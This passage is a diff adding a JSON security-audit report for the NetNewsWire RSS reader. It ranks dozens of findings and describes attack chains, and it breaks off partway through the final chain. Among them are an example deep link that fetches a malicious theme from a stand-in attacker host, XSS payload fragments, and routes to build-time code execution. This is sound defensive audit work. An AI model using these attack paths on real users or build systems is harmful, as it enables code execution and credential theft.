@@ -1,0 +1,366 @@
+```json
+{
+  "summary": "NetNewsWire presents a critical build-pipeline risk through unsandboxed Python eval in gyb.py (finding 32) and version-controlled Xcscheme pre-build scripts (finding 22), either of which delivers arbitrary developer-machine code execution on a single merged commit. For end users the most consequential chain is a one-click-from-web-page attack via the netnewswire://theme/add deep link that fetches an arbitrary archive, bypasses all signature and path-traversal checks, and installs a persistent malicious JavaScript bundle executed by WKWebView on every article render. Globally disabled App Transport Security amplifies all network-layer findings, enabling cleartext credential interception for NewsBlur and user-configured FreshRSS, and the Feedbin pagination forwarding bug (finding 41) sends credentials to any host specified in a server-controlled Link header. Seventeen independent stored-XSS entry points in the article-rendering templates collectively expose the WKWebView script-message bridge to attacker JavaScript, though renderer-process isolation prevents escalation to native host code execution.",
+  "ranked_findings": [
+    {
+      "index": 32,
+      "severity": "critical",
+      "exploitability_notes": "gyb.py compiles and evals arbitrary Python from .gyb template files with full builtins access and no sandbox. A single committed change to any .gyb file — via PR, compromised maintainer account, or dependency substitution — executes arbitrary OS commands on every developer and CI machine at build time. CVSS base ~9.0 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H). This is production build infrastructure, not test code; no downgrade trigger applies."
+    },
+    {
+      "index": 22,
+      "severity": "high",
+      "exploitability_notes": "Xcscheme PreActions scriptText is version-controlled XML executed by Xcode before compilation with no approval prompt. A merged commit changing the shell snippet runs arbitrary commands on every developer and CI machine. CVSS 8.7. Scheme XML diffs are rarely code-reviewed; single precondition is getting a commit merged. Distinct from finding 32 but both reach developer-machine RCE."
+    },
+    {
+      "index": 41,
+      "severity": "high",
+      "exploitability_notes": "FeedbinAPICaller.retrieveEntries(page:) constructs a URLRequest to the server-supplied pagination URL from the Link response header and attaches the full Authorization:Basic header (Feedbin username and password) with no host-allowlist check. An attacker controlling the Feedbin API server or on-path for the API connection can redirect credential-bearing requests to any host. CVSS ~7.2 (AV:N/AC:H/PR:N/UI:N/S:C/C:H). AC:H reflects API-server compromise or MITM requirement; impact is full Feedbin credential disclosure."
+    },
+    {
+      "index": 21,
+      "severity": "high",
+      "exploitability_notes": "XOR-encoded API keys are stored alongside their own 64-byte salt as static byte arrays in the production binary. A single Ghidra/Hopper/strings pass immediately recovers plaintext keys — no runtime secret, keychain, or network call involved. CVSS ~7.3–8.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L). Any user who downloads the app binary can extract third-party service API keys. Blast radius is limited to the specific keys embedded."
+    },
+    {
+      "index": 0,
+      "severity": "medium",
+      "exploitability_notes": "netnewswire://theme/add?url= on iOS accepts any URL (http://, ftp://, RFC-1918 addresses) without host or scheme validation, triggers a URLSession download to that URL, and passes the result to unvalidated zip extraction. Triggerable from any web page via a single-click link, requiring only UI:R. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Primary entry point for the deep-link → zip-slip → persistent WKWebView JS chain."
+    },
+    {
+      "index": 13,
+      "severity": "medium",
+      "exploitability_notes": "macOS AppleScript/URL-scheme handler for netnewswire://theme has the identical unvalidated URL download flaw as finding 0, additionally permitting file:// (Foundation URLSession copies any user-readable local file into the theme processor). CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Shares the zip-slip chain entry with finding 0."
+    },
+    {
+      "index": 3,
+      "severity": "medium",
+      "exploitability_notes": "Feed-supplied author names and email addresses are concatenated unescaped into byline HTML rendered verbatim in WKWebView. An attacker-controlled feed can inject inline event handlers (onerror=, onmouseover=) that execute JS in the WKWebView context. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Team knew HTML escaping was needed (article titles use sanitizedTitle) but missed author fields."
+    },
+    {
+      "index": 20,
+      "severity": "medium",
+      "exploitability_notes": "htmlByAddingLink constructs HTML anchors via raw Swift string interpolation with no encoding for href, className, or link text. All three are feed-derived: javascript: href, attribute-break via quote in className, or raw HTML tags in text. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Used throughout the rendering pipeline that populates WKWebView."
+    },
+    {
+      "index": 23,
+      "severity": "medium",
+      "exploitability_notes": "newsfoot.js assigns feed-supplied footnote innerHTML to a newly created element via inner.innerHTML. Event-handler attributes (onerror, onload, onmouseover) on dynamically created elements fire immediately even under a script-src CSP. No user interaction beyond viewing the article with a footnote link. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C)."
+    },
+    {
+      "index": 30,
+      "severity": "medium",
+      "exploitability_notes": "Hyperlegible theme substitutes [[body]] (raw feed HTML) directly into a div. Malicious article bodies containing <script> or event-handler attributes execute in WKWebView. CVSS 6.1. Common rendering path for all articles in this theme; confirmed JS execution context via registered message handlers."
+    },
+    {
+      "index": 31,
+      "severity": "medium",
+      "exploitability_notes": "Sepia theme injects multiple unencoded feed metadata fields (title, byline, external_link_stripped) into HTML text positions. A feed title of '<script>…</script>' or '<img src=x onerror=…>' executes on article render. CVSS 6.1. Multiple fields are injection points simultaneously, making exploitation trivial for any feed operator."
+    },
+    {
+      "index": 57,
+      "severity": "medium",
+      "exploitability_notes": "source:markdown RSS extension passes attacker-controlled Markdown through Tidemark, which per CommonMark §4.6 passes raw HTML blocks unchanged. A feed item with '<script>…</script>' in the Markdown field delivers a live script tag into article contentHTML stored in the DB and rendered by WKWebView. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Requires the source:markdown namespace, which limits real-world prevalence."
+    },
+    {
+      "index": 25,
+      "severity": "medium",
+      "exploitability_notes": "All six bundled themes place feed-supplied URLs (preferred_link, feed_link, external_link) into href attributes with no scheme allow-list. A javascript: URI in the feed link executes JS when the user clicks the rendered anchor; navigation-policy blocking of javascript: scheme is unconfirmed. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C)."
+    },
+    {
+      "index": 34,
+      "severity": "medium",
+      "exploitability_notes": "OpenInSafariActivity (iOS) stores the article URL (from RSS <link>) without scheme validation and passes it directly to UIApplication.shared.open. A tel:, sms:, facetime:, or custom deep-link URI in the feed invokes the corresponding handler without any warning when the user taps the Share action. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C)."
+    },
+    {
+      "index": 58,
+      "severity": "medium",
+      "exploitability_notes": "macOS theme install dialog embeds the attacker-supplied creatorHomePage as an NSAttributedString .link attribute; clicking the link in the NSTextView passes the raw string to NSWorkspace.shared.open with no scheme restriction, opening tel:, custom://, or javascript: URIs. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Requires one user click in the install-confirmation alert."
+    },
+    {
+      "index": 7,
+      "severity": "medium",
+      "exploitability_notes": "XMLSAXParser appends all character data including CDATA into an unbounded [UInt8] buffer with no size cap. A feed element with a multi-GB text node exhausts device memory and crashes the app. CVSS 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H). Triggered by subscribing to any malicious feed; no interaction beyond app refresh."
+    },
+    {
+      "index": 39,
+      "severity": "medium",
+      "exploitability_notes": "DecodingError.typeMismatch or .valueNotFound during theme plist decoding triggers an unconditional force-cast of a Swift metatype to CVarArg — a protocol the type does not conform to — causing EXC_BAD_INSTRUCTION and process death. CVSS 6.5 (AV:N/AC:L/PR:N/UI:R/A:H). Triggered by feeding a malformed .nnwtheme through the deep-link download chain (finding 0)."
+    },
+    {
+      "index": 19,
+      "severity": "medium",
+      "exploitability_notes": "HTTPLinkPagingInfo unconditionally accesses components[1] after splitting the server-supplied Link header on '; '. A Link entry without the rel token yields a one-element array and crashes the process on out-of-bounds access. CVSS 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/A:H). AC:H because the header must be malformed in a specific way; any paginatable feed server could trigger this."
+    },
+    {
+      "index": 24,
+      "severity": "medium",
+      "exploitability_notes": "Appanoose theme places [[external_link_stripped]] and [[feed_link]] verbatim inside double-quoted JavaScript string literals. A feed link containing a quote terminates the string and injects arbitrary JS executed on DOMContentLoaded with no further user interaction. CVSS ~4.9 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L). Broader template XSS but confined to JS context rather than full HTML."
+    },
+    {
+      "index": 46,
+      "severity": "medium",
+      "exploitability_notes": "Feedly OAuth authorization code is logged at ERROR level (persisted to disk in ~/Library/Logs) and DEBUG level (visible via os_log stream) verbatim in the callback URL. Any same-user process can read the persisted log or subscribe to the log stream and steal the code for immediate exchange. CVSS ~7.0 (AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H); borderline High/Medium — downgraded per 'can't decide → pick lower tier' rule due to AV:L + AC:H + specific edge-case trigger."
+    },
+    {
+      "index": 43,
+      "severity": "medium",
+      "exploitability_notes": "FreshRSS account setup accepts a user-supplied http:// endpoint. With ATS globally disabled (finding 2), every sync request — including initial credentials and all subsequent session tokens — travels in cleartext for the account's lifetime. Adjacent-network attacker can passively capture. CVSS ~5.3 (AV:N/AC:H). AC:H because the user must configure an http:// endpoint; once configured the exposure is ongoing."
+    },
+    {
+      "index": 2,
+      "severity": "medium",
+      "exploitability_notes": "NSAllowsArbitraryLoads:true globally removes ATS across all URLSession instances in both iOS and macOS targets, eliminating TLS 1.2+ enforcement and forward-secrecy requirements. On its own this is a configuration weakness; its primary role is as a force-multiplier enabling findings 43 and T1 (NewsBlur cleartext POST), and removing the last client-side safeguard for any http:// feed URL. CVSS 5.4 (AV:A/AC:H/S:C)."
+    },
+    {
+      "index": 15,
+      "severity": "medium",
+      "exploitability_notes": "FeedFinder fires unlimited concurrent Downloader requests to all candidate URLs extracted from attacker-controlled HTML page links matching feed-keyword substrings, with no concurrency cap, no scheme validation (file:// accepted), and no overall timeout. An attacker-controlled Add-Feed URL can direct requests to internal network hosts (SSRF) and exhaust connection resources. CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:C)."
+    },
+    {
+      "index": 35,
+      "severity": "medium",
+      "exploitability_notes": "AddWebFeedIntent is absent from IntentsRestrictedWhileLocked, making it available via Siri on the lock screen. Physical proximity to the device allows subscription to an attacker-specified feed URL without biometric re-authentication. CVSS 5.4 (AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L). Requires adjacent physical access only; no device unlock needed."
+    },
+    {
+      "index": 44,
+      "severity": "medium",
+      "exploitability_notes": "JSONFeedParser stores article URLs (url, external_url, homePageURL, iconURL, faviconURL) verbatim from untrusted JSON with no scheme check, persisting javascript:, file://, and data: URIs into the article database. Combined with findings 25 and 6, javascript: URIs reach WKWebView hrefs. CVSS ~4.9 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L). AtomParser is immune; JSONFeedParser is not."
+    },
+    {
+      "index": 45,
+      "severity": "medium",
+      "exploitability_notes": "RSSParser stores javascript:, file://, and data: URIs in article and feed link fields without scheme validation. AtomParser is immune (isValidURLString guard). Combined with findings 25 and 6 this enables javascript: link injection via RSS. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L)."
+    },
+    {
+      "index": 6,
+      "severity": "medium",
+      "exploitability_notes": "iOS WKWebView decidePolicyFor has a catch-all else{decisionHandler(.allow)} that passes file://, data:, and custom-scheme navigations to WebKit unblocked. A data: URI with embedded JavaScript executes in the same WKWebView context as registered message handlers. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L). Third step in the javascript:-href execution chain (findings 44/45 → 25 → 6)."
+    },
+    {
+      "index": 51,
+      "severity": "medium",
+      "exploitability_notes": "Theme import copies archive contents verbatim with no cryptographic signature check, HTML tag allowlist, or path-traversal guard. Any <script> or event-handler attributes in template.html execute in WKWebView on every article render. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L). Persistence mechanism in the deep-link → zip-slip chain (findings 0/13)."
+    },
+    {
+      "index": 36,
+      "severity": "medium",
+      "exploitability_notes": "ArticleThemeImporter opens theme.creatorHomePage via UIApplication.shared.open without scheme restriction, allowing tel:, sms:, or custom deep-link URIs from a malicious .nnwtheme to invoke system handlers. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L). Triggered when user opens a crafted theme file and taps the creator link."
+    },
+    {
+      "index": 47,
+      "severity": "medium",
+      "exploitability_notes": "CI workflow uses floating mutable tags (actions/checkout@v5, actions/upload-artifact@v4) rather than pinned commit SHAs. Tag retargeting to a malicious commit silently exfiltrates repo secrets and injects malicious build artifacts on every push-to-main run. CVSS 4.7 (AV:N/AC:H/S:C). AC:H reflects the prerequisite of hijacking the tag on GitHub."
+    },
+    {
+      "index": 62,
+      "severity": "medium",
+      "exploitability_notes": "VerifyNoBS.swift uses ICU character class [:space:] (the six literal characters :, s, p, a, c, e) instead of [[:space:]], so the buildSettings detection regex never matches a real Xcode project file. The build-settings CI gate always returns success, silently allowing unauthorized build-setting injections to ship. CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:C). Integrity impact — a permanent safety bypass."
+    },
+    {
+      "index": 52,
+      "severity": "medium",
+      "exploitability_notes": "ArticleIconSchemeHandler serves nnw-icon:// sub-resource requests from any page origin without same-origin enforcement. Attacker article HTML enumerates article IDs via img load/error timing events, learning which articles the victim has in their database. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L). Privacy oracle; no write or execution path."
+    },
+    {
+      "index": 10,
+      "severity": "medium",
+      "exploitability_notes": "Right-click context menu opens the article link (fully feed-controlled) via Browser.open() without scheme validation. A javascript: or custom-scheme URI in the RSS <link> field executes when the user selects 'Open in Browser'. CVSS 4.7 (AV:N/AC:L/PR:N/UI:R/S:C/C:L). Requires user right-click action on the specific article."
+    },
+    {
+      "index": 9,
+      "severity": "medium",
+      "exploitability_notes": "MacWebBrowser.openURL static method passes the raw url (not preparedURL) to NSWorkspace in the inBackground branch, bypassing URL sanitization including credential stripping and scheme canonicalization. Feed-derived URLs with embedded user:password@ authority components opened in background tabs retain credentials in the browser history. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L)."
+    },
+    {
+      "index": 28,
+      "severity": "medium",
+      "exploitability_notes": "The bundled default 'Scripting News' feed uses an http:// URL fetched without TLS on every refresh. An adjacent-network attacker can inject malicious article content into this feed without breaking any cryptographic protection. CVSS 4.2 (AV:A/AC:H). Blast radius limited to the single default feed; ACS disabled (finding 2) removes the last client-side guard."
+    },
+    {
+      "index": 48,
+      "severity": "medium",
+      "exploitability_notes": "mouseDidEnter WKScript message sets the macOS status bar label from the href attribute of any article link, with only http/https prefix stripping (not a scheme allowlist). When article JS is enabled, arbitrary JS can call window.webkit.messageHandlers.mouseDidEnter.postMessage(anyString) to display misleading text. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). UI deception primitive; no code execution."
+    },
+    {
+      "index": 5,
+      "severity": "medium",
+      "exploitability_notes": "XMLSAXParser handleEnd() performs an O(N) stack scan for each orphan close tag, producing O(N²) total work for N unclosed elements followed by N mismatched close tags. A ~350 KB feed triggers ~2.5B comparisons, sustained CPU DoS. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). App may become unresponsive but process does not crash; eventual recovery when feed refresh completes."
+    },
+    {
+      "index": 8,
+      "severity": "medium",
+      "exploitability_notes": "ReaderAPI retrieveItemIDs uses unbounded async tail-recursion driven by server-supplied continuation tokens with no page cap or item-count limit. A malicious/compromised ReaderAPI server can drive infinite looping or accumulate millions of item IDs, exhausting memory. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). Requires ReaderAPI account configured; automatic refresh means no additional user trigger needed."
+    },
+    {
+      "index": 1,
+      "severity": "medium",
+      "exploitability_notes": "imageWasClicked WKScript message handler issues Downloader.shared.download() to any attacker-supplied URL from article JS, bypassing WKContentRuleList content blocking entirely (uses URLSession not WebKit network stack). Attacker feed JS can probe internal hosts (SSRF) or load tracking pixels blocked by ad-blockers. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L)."
+    },
+    {
+      "index": 14,
+      "severity": "medium",
+      "exploitability_notes": "HTMLMetadataDatabase.noteFailure() is a no-op when a prior success record exists (guard on isFailure). Both in-memory cache and DB continue showing success, preventing any 4xx backoff until the 149-hour TTL expires, then the cycle restarts. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/C:L). Low direct impact; amplifies resource exhaustion when combined with finding 15."
+    },
+    {
+      "index": 18,
+      "severity": "medium",
+      "exploitability_notes": "waitingForAvatarURLs in AuthorAvatarDownloader is never purged on memory pressure (only the image cache is cleared). Feed authors with many distinct non-http avatar URLs grow the set unboundedly across refreshes. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). Slow leak; requires many distinct feed authors over time to become significant."
+    },
+    {
+      "index": 16,
+      "severity": "medium",
+      "exploitability_notes": "URLRequest+Account passes server-supplied ETag/Last-Modified values into HTTP header fields with only a hardcoded year-string exclusion. Modern CFNetwork rejects CR/LF in header values (process termination), but older OS versions may allow HTTP response-header injection. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/A:L). OS-level mitigation on modern Apple platforms substantially reduces exploitability."
+    },
+    {
+      "index": 27,
+      "severity": "medium",
+      "exploitability_notes": "isNetNewsWireBrandedFeed uses hasSuffix('netnewswire.com') with no leading-dot anchor, so any hostname ending in those characters (evil-netnewswire.com) receives the official NNW icon, enabling UI spoofing for look-alike feeds. CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). Integrity-only impact; no code execution path."
+    },
+    {
+      "index": 56,
+      "severity": "medium",
+      "exploitability_notes": "FaviconDownloader stores the first attacker-supplied faviconURL for any homePageURL into SQLite on first write; subsequent legitimate fetches are short-circuited by the poisoned entry forever (orReplace is a no-op for existing rows). CVSS 4.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L). Permanent integrity corruption for a low-sensitivity asset."
+    },
+    {
+      "index": 40,
+      "severity": "medium",
+      "exploitability_notes": "symbolicate_json_crash.sh passes jq-extracted crash-log fields ($image_offset, $base_address) directly into bash arithmetic $((...)), allowing command substitution if either variable contains $(cmd). CVSS ~7.4 (AV:L/AC:L/PR:N/UI:R/C:H/I:H/A:H) but downgraded one tier: this is a developer crash-symbolication tool (non-prod code), not shipped app code. Requires a developer to process a crafted crash log."
+    },
+    {
+      "index": 59,
+      "severity": "medium",
+      "exploitability_notes": "scan-netnewswire.sh shallow-clones an external GitHub repo at HEAD with no pinned SHA, pip-installs it (executes build hooks), then runs vvaharness scan which explicitly edits source files in TARGET_DIR. CVSS ~7.6 (AV:N/AC:H/S:C/C:H/I:H) but downgraded one tier: this is a security-scanning harness script (non-prod tooling), not shipped app code. Attacker must first compromise the external repo's default branch."
+    },
+    {
+      "index": 4,
+      "severity": "low",
+      "exploitability_notes": "OPML parser maintains an unbounded itemStack; 1M nested <outline> elements allocate hundreds of MiB and OOM-crash the app. CVSS 5.5 (AV:L/AC:L/PR:N/UI:R/A:H) — downgraded from Medium: AV:L requires the user to open a malicious local file from Finder; no remote trigger path identified. DoS impact only."
+    },
+    {
+      "index": 11,
+      "severity": "low",
+      "exploitability_notes": "Sparkle update feed URL is stored in UserDefaults under the well-known SUFeedURL key, writable by any same-user process. Redirecting updates requires local code execution plus Sparkle to auto-install the poisoned update — two independent preconditions. CVSS 5.0 (AV:L/AC:L/PR:L/S:C) but downgraded for AV:L and multi-step attack chain."
+    },
+    {
+      "index": 12,
+      "severity": "low",
+      "exploitability_notes": "macOS Share Extension force-casts results['url'] to String; a webpage returning any non-String value from its JS preprocessor crashes the extension process. CVSS 3.1 (AV:N/AC:H/A:L). AC:H because the page must deliberately return a non-String; only the extension (not the main app) is affected."
+    },
+    {
+      "index": 17,
+      "severity": "low",
+      "exploitability_notes": "NewsBlur story-hash parser iterates unbounded server JSON containers, allocating StoryHash structs without limit. A malicious NewsBlur server response can exhaust memory. CVSS 3.7 (AV:N/AC:H/A:L). AC:H reflects requirement of a compromised or attacker-operated NewsBlur server."
+    },
+    {
+      "index": 26,
+      "severity": "low",
+      "exploitability_notes": "SendToMicroBlogCommand builds a Markdown link from unescaped feed title and URL; an attacker can break out of the link syntax and inject Markdown elements into the Micro.blog post body. CVSS 3.1 (AV:N/AC:H/I:L). Impact limited to Micro.blog post content; requires user to explicitly invoke the Share-to-Micro.blog action."
+    },
+    {
+      "index": 29,
+      "severity": "low",
+      "exploitability_notes": "ExtensionFeedAddRequestFile.process() fails to clear the plist when the write throws, causing duplicate feed-subscription processing on the next event. CVSS 2.5 (AV:L/AC:H/PR:N/UI:R/I:L). Local file-system race, low impact (duplicate subscription only)."
+    },
+    {
+      "index": 33,
+      "severity": "low",
+      "exploitability_notes": "AppDefaults debug logger emits full UI state (selected article dict, container identifiers, scroll position) on launch in any Console-attached session; scalar fields are emitted in release builds. CVSS 2.4 (AV:P/AC:L/C:L). Physical device access or Xcode attachment required; no remote exfiltration path."
+    },
+    {
+      "index": 37,
+      "severity": "low",
+      "exploitability_notes": "MultilineUILabelSizer caches label sizes in an unbounded static dictionary keyed by (string, width). Feeds with many unique article titles slowly bloat memory; cleared only on low-memory or background notifications. CVSS 3.1 (AV:N/AC:H/A:L). Slow accumulation; requires sustained feed with many distinct strings over time."
+    },
+    {
+      "index": 38,
+      "severity": "low",
+      "exploitability_notes": "iOS Share Extension force-casts results['url'] to String identically to finding 12. CVSS 3.1 (AV:N/AC:H/A:L). Crashes the extension process only; main app is unaffected."
+    },
+    {
+      "index": 42,
+      "severity": "low",
+      "exploitability_notes": "CredentialsManager stores keychain items with kSecAttrAccessibleAfterFirstUnlock (no ThisDeviceOnly suffix), allowing all sync credentials (OAuth tokens, plaintext passwords) to migrate to encrypted backups. CVSS 4.2 (AV:P/AC:H/C:H) — downgraded from Medium: physical access to an unlocked device AND possession of the backup decryption key are required simultaneously."
+    },
+    {
+      "index": 49,
+      "severity": "low",
+      "exploitability_notes": "cancelAndRemoveTasksWithHost uses String.contains (substring match) for 429-throttling; a server at 'ample.com' inadvertently cancels in-flight tasks for 'example.com'. CVSS 3.1 (AV:N/AC:H/A:L). Temporary availability impact limited to in-flight tasks for the current session."
+    },
+    {
+      "index": 50,
+      "severity": "low",
+      "exploitability_notes": "ActivityLogViewModel interpolates error.localizedDescription (which URLSession includes full request URLs with potential user:password@ credentials) into the visible Activity Log. CVSS 3.3 (AV:L/AC:L/PR:N/UI:R/C:L). Requires local access to open the Activity Log; no remote exfiltration path."
+    },
+    {
+      "index": 53,
+      "severity": "low",
+      "exploitability_notes": "storeCredentials delete-then-add is non-atomic; if SecItemDelete succeeds but SecItemAdd encounters a transient error, the credential is permanently gone with no retry or rollback. Causes silent sync failures on Feedly token rotation. CVSS 3.7 (AV:N/AC:H/A:L). Availability-only; no credential disclosure path."
+    },
+    {
+      "index": 54,
+      "severity": "low",
+      "exploitability_notes": "SyncStatusTable.selectForProcessing marks all rows selected=true before applying LIMIT, leaving non-returned rows permanently stuck and invisible to pending-check queries. Causes incomplete sync convergence under load. CVSS 3.1 (AV:N/AC:H/PR:L/I:L). Integrity-only; requires specific concurrency timing."
+    },
+    {
+      "index": 55,
+      "severity": "low",
+      "exploitability_notes": "Content-blocking rules compilation is async; a WKWebView created before compilation finishes silently receives no rules and is never retried for that controller. During the compile window (potentially hundreds of ms on first launch) the view has zero content blocking. CVSS 3.1 (AV:N/AC:H/C:L). Short-lived race; practically significant only during initial app launch."
+    },
+    {
+      "index": 60,
+      "severity": "low",
+      "exploitability_notes": "CloudKitArticlesZoneDelegate.stripPrefix unconditionally advances String.Index by 2 without a bounds check. A CloudKit record name shorter than 2 characters causes a fatal precondition failure. CVSS 2.7 (AV:N/AC:L/PR:H/A:L). PR:H reflects that triggering requires CloudKit admin access or a separate bug in record-ID generation."
+    },
+    {
+      "index": 61,
+      "severity": "low",
+      "exploitability_notes": "NewsBlurFeedsResponse builds a flat visibleFeedIDs array from all folder-feed mappings and filters with O(n) contains per feed, yielding O(F×M×N) total complexity. A malicious NewsBlur server with many folders/feeds can cause CPU exhaustion during refresh. CVSS 3.1 (AV:N/AC:H/PR:L/A:L). Requires attacker-controlled or compromised NewsBlur server."
+    }
+  ],
+  "chains": [
+    {
+      "title": "Supply-Chain Build Pipeline → Developer Machine RCE → Production Binary Backdoor",
+      "steps": [32, 22, 47],
+      "severity": "critical",
+      "blocked_by_controls": [],
+      "narrative": "Finding 32 is the primary vector: gyb.py reads .gyb template files and passes extracted code blocks to Python's compile() then eval() with no sandbox and full builtins access, giving any .gyb template change unrestricted OS-level code execution on the developer's machine at build time. Finding 22 provides a parallel path via version-controlled Xcscheme PreActions: any commit that modifies the scriptText XML attribute in xcshareddata/xcschemes executes arbitrary shell commands without an Xcode approval prompt before the compiler runs. Finding 47 extends the attack surface to CI: actions/checkout@v5 and actions/upload-artifact@v4 are mutable floating tags; the tag owner (or an attacker who compromises those repos) can silently retarget them to execute malicious code on the CI runner, which on push-to-main runs has access to all repository secrets. Any one of these three paths allows an attacker to backdoor the production binary before code signing, exfiltrate developer credentials, or pivot to the infrastructure. No design control in scope blocks any of these paths."
+    },
+    {
+      "title": "Web Page Click → Deep Link → Zip-Slip → Persistent WKWebView JavaScript Injection",
+      "steps": [0, 51, 30],
+      "severity": "high",
+      "blocked_by_controls": ["App sandbox limits writes to the container — no cross-process OS escape confirmed from WKWebView context"],
+      "narrative": "Step 1 (finding 0): An attacker embeds a hyperlink such as netnewswire://theme/add?url=https://attacker.com/evil.nnwtheme on any web page. A single user click triggers the iOS URL scheme handler in SceneDelegate, which fetches the attacker-controlled URL via URLSession with no host-allowlist, scheme check, or redirect limit, then passes the downloaded file to ArticleThemeDownloader.handleFile for zip extraction. No path-traversal guard exists on the extraction, enabling zip-slip writes to any path within the sandbox container the app can write to. Step 2 (finding 51): Because ArticleThemesManager.importTheme performs no cryptographic signature check, hash verification, or HTML tag allowlist on the archive contents, any template.html with embedded script tags or inline event handlers is copied verbatim into the Themes directory. Step 3 (finding 30/31): Every subsequent article render loads the installed template, executing attacker JavaScript in the WKWebView context. That JavaScript can call all registered window.webkit.messageHandlers.* endpoints, read every rendered article's full HTML, and exfiltrate data to an attacker-controlled server. The injected theme persists across app restarts until manually removed. The macOS variant (finding 13) shares this entire chain and additionally allows file:// scheme in the download URL, enabling local file content to be passed into the theme processor."
+    },
+    {
+      "title": "ATS Globally Disabled + HTTP Service Endpoints → Cleartext Credential Interception",
+      "steps": [2, 43],
+      "severity": "high",
+      "blocked_by_controls": ["HTTPS enforced server-side by most services (Feedbin, Feedly); only explicitly http:// endpoints are fully exposed"],
+      "narrative": "Finding 2 removes all client-side TLS enforcement via NSAllowsArbitraryLoads:true in both platform Info.plist files, meaning every URLSession in the app will follow http:// URLs without error or upgrade. Finding 43 allows users to configure FreshRSS with a user-supplied http:// endpoint; after configuration every sync request — including the initial username/password submission and all subsequent session tokens — travels in cleartext for the lifetime of the account. An adjacent-network attacker (public WiFi, corporate MITM proxy) passively captures these credentials with zero cryptographic work. The analogous NewsBlur path (T1 in the threat model) works identically: with ATS disabled and no client-side HTTPS enforcement, NewsBlur credentials sent as an HTTP form-body POST are fully readable on the wire. The combination of finding 2 with any cleartext service endpoint constitutes a complete, low-precondition credential-theft chain requiring only network adjacency."
+    },
+    {
+      "title": "Feedbin API Server Compromise → Malicious Link Header → Credentials to Attacker Server",
+      "steps": [41, 2],
+      "severity": "high",
+      "blocked_by_controls": ["Feedbin API enforces HTTPS server-side; AC:H reflects MITM or server-compromise prerequisite"],
+      "narrative": "Finding 41: FeedbinAPICaller.retrieveEntries(page:) reads the pagination URL from the server-supplied Link response header, constructs a URLRequest to that arbitrary URL, and attaches the full Authorization:Basic header containing the Feedbin username and password, with no check that the resulting host matches api.feedbin.com. Finding 2 (ATS disabled) removes the client's only defense against http:// pagination URLs: if Feedbin's API returns an http:// Link header (due to misconfiguration, CDN compromise, or server-side attack), the credential-bearing request travels in cleartext to whatever host the attacker specifies. An attacker who achieves on-path MITM of the Feedbin API connection, or who compromises Feedbin's API server to return crafted Link headers, can redirect the Basic-auth header to any controlled host and receive the user's plaintext Feedbin credentials. This yields full Feedbin account takeover."
+    },
+    {
+      "title": "RSS/JSON Non-HTTP URIs Stored → javascript: href in Templates → Navigation Policy Bypass → WKWebView XSS",
+      "steps": [44, 45, 25, 6],
+      "severity": "medium",
+      "blocked_by_controls": ["Modern WebKit versions may block javascript: navigations at the engine level; decidePolicyFor outcome for javascript: scheme not confirmed from code snapshot"],
+      "narrative": "Findings 44 and 45: JSONFeedParser and RSSParser both store article link fields verbatim from untrusted feed data without scheme validation, allowing javascript: URIs to be persisted in the article database (AtomParser is immune via isValidURLString). Finding 25: All six bundled theme templates inject feed-supplied link fields directly into HTML href attributes without a scheme allow-list, rendering markup such as <a href='javascript:attackerCode()'>. Finding 6: The iOS WKWebView decidePolicyFor handler contains a catch-all else { decisionHandler(.allow) } that passes all navigations with non-http/https/mailto/tel schemes back to WebKit unblocked. If WebKit honors the javascript: navigation (behavior varies by version and context), the attacker's JavaScript executes in the same rendering context as all registered message handlers. The chain is pre-auth and requires only that the user clicks the article link, triggering execution with no additional user gesture."
+    },
+    {
+      "title": "Feed Stored XSS (Multiple Entry Points) → WKWebView Script Message Bridge → Native Privileged Actions",
+      "steps": [3, 23, 30, 57, 48],
+      "severity": "medium",
+      "blocked_by_controls": ["WKWebView renderer-process isolation prevents direct native memory access; full scope of bridge handler capabilities not determinable from snapshot alone"],
